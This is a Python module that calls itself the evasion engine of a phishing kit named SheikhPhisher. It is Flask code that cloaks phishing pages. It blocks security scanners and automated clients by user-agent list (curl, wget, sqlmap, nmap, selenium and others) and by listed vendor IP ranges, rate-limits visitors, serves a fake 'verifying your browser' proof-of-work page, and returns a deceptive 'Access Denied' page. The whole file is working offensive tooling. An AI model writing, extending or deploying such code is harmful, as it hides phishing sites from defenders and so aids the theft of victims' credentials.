#!/usr/bin/env python3
# modules/evasion.py - SheikhPhisher Evasion Engine
# Anti-bot, anti-detection, human simulation

import os, re, time, json, hashlib, logging, random, string
from datetime import datetime
from flask import request, Response, make_response, render_template_string

log = logging.getLogger(__name__)

class EvasionEngine:
    """Evasion and anti-detection engine"""
    
    def __init__(self, config, profile='balanced'):
        self.config = config
        self.profile = profile
        self.settings = config.get('evasion', {}).get(profile, {})
        
        # Bot signatures to block
        self.blocked_agents = [
            r'bot', r'crawler', r'spider', r'scrapy', r'curl', r'wget',
            r'python-requests', r'python-urllib', r'go-http-client',
            r'nikto', r'sqlmap', r'nmap', r'zgrab', r'masscan',
            r'headless', r'phantom', r'selenium', r'puppet',
        ]
        
        # Known security vendor IP ranges (simplified)
        self.security_orgs = [
            '104.16.0.0/12',  # Cloudflare
            '185.220.101.0/24',
        ]
        
        # Rate limiting tracking
        self.ip_requests = {}
        self.fingerprint_cache = {}
    
    def should_block(self, flask_request):
        """Determine if request should be blocked based on evasion profile"""
        if self.profile == 'aggressive':
            return False  # Let everything through
        
        client_ip = flask_request.remote_addr
        user_agent = flask_request.headers.get('User-Agent', '')
        
        # Check rate limits
        if self.settings.get('rate_limit', 0) > 0:
            now = time.time()
            window = 60  # 1 minute window
            
            if client_ip not in self.ip_requests:
                self.ip_requests[client_ip] = []
            
            # Clean old entries
            self.ip_requests[client_ip] = [t for t in self.ip_requests[client_ip] if now - t < window]
            
            if len(self.ip_requests[client_ip]) >= self.settings['rate_limit']:
                log.warning(f"[EVASION] Rate limit exceeded for {client_ip}")
                return True
            
            self.ip_requests[client_ip].append(now)
        
        # Block headless browsers
        if self.settings.get('block_headless', False):
            headless_indicators = ['headless', 'phantom', 'selenium', 'webdriver']
            ua_lower = user_agent.lower()
            for indicator in headless_indicators:
                if indicator in ua_lower:
                    log.warning(f"[EVASION] Blocked headless browser: {indicator} from {client_ip}")
                    return True
        
        # Block known bots
        if self.settings.get('block_known_bots', False):
            for pattern in self.blocked_agents:
                if re.search(pattern, user_agent, re.I):
                    log.warning(f"[EVASION] Blocked bot: {user_agent[:60]} from {client_ip}")
                    return True
        
        # Browser fingerprint check (proxy not set, no JS, etc.)
        if self.settings.get('browser_fingerprint', False):
            # Check for missing JavaScript headers
            accept = flask_request.headers.get('Accept', '')
            if 'text/html' in accept and 'application/xhtml+xml' not in accept:
                # Might be curl/wget - but let through for now
                pass
        
        return False
    
    def needs_challenge(self, flask_request):
        """Determine if a proof-of-work challenge is needed"""
        if not self.settings.get('challenge_required', False):
            return False
        
        # Check if client has solved a challenge recently
        client_ip = flask_request.remote_addr
        challenge_cookie = flask_request.cookies.get('sp_challenge')
        
        if challenge_cookie:
            try:
                decoded = self._decode_challenge(challenge_cookie)
                if decoded.get('ip') == client_ip and decoded.get('expires', 0) > time.time():
                    return False
            except:
                pass
        
        # Only challenge on first request to main page
        return flask_request.path == '/'
    
    def serve_challenge(self, flask_request):
        """Serve a proof-of-work challenge page (JS-based)"""
        client_ip = flask_request.remote_addr
        challenge_id = hashlib.sha256(f"{client_ip}{random.random()}{time.time()}".encode()).hexdigest()[:16]
        
        challenge_html = f'''<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Verifying your browser...</title>
<style>
    body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
           display: flex; justify-content: center; align-items: center; min-height: 100vh; 
           background: #f0f2f5; margin: 0; }}
    .container {{ text-align: center; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
    .spinner {{ width: 40px; height: 40px; border: 4px solid #e0e0e0; border-top: 4px solid #0066ff; border-radius: 50%; 
                animation: spin 0.8s linear infinite; margin: 20px auto; }}
    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
</style></head>
<body>
<div class="container">
    <h2>Verifying your browser</h2>
    <p>Please wait while we verify your browser...</p>
    <div class="spinner"></div>
</div>
<script>
    // Proof of work - calculate hash with required prefix
    const challenge = "{challenge_id}";
    const targetPrefix = "0000";
    let nonce = 0;
    
    async function solve() {{
        while(true) {{
            const hash = await crypto.subtle.digest('SHA-256', 
                new TextEncoder().encode(challenge + nonce));
            const hashArray = Array.from(new Uint8Array(hash));
            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            if(hashHex.startsWith(targetPrefix)) {{
                document.cookie = "sp_challenge=" + btoa(JSON.stringify({{ip:"{client_ip}",nonce:nonce,expires:{int(time.time()) + 300}}}}) + "; path=/; max-age=300";
                window.location.reload();
                break;
            }}
            nonce++;
        }}
    }}
    setTimeout(() => solve(), 100);
</script>
</body></html>'''
        
        return make_response(challenge_html)
    
    def block_response(self):
        """Return a deceptive block response"""
        html = '''<!DOCTYPE html>
<html><head><title>Access Denied</title><style>
body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; }
.container { text-align: center; padding: 40px; }
h1 { color: #d32f2f; }
</style></head><body>
<div class="container">
    <h1>Access Denied</h1>
    <p>Your request could not be processed.</p>
    <p style="color:#888;font-size:12px;">Reference: ERR_BLOCKED_CLIENT</p>
</div>
</body></html>'''
        return Response(html, status=403, content_type='text/html')
    
    def _decode_challenge(self, cookie_value):
        """Decode challenge cookie"""
        import base64
        try:
            decoded = base64.b64decode(cookie_value).decode()
            return json.loads(decoded)
        except:
            return {}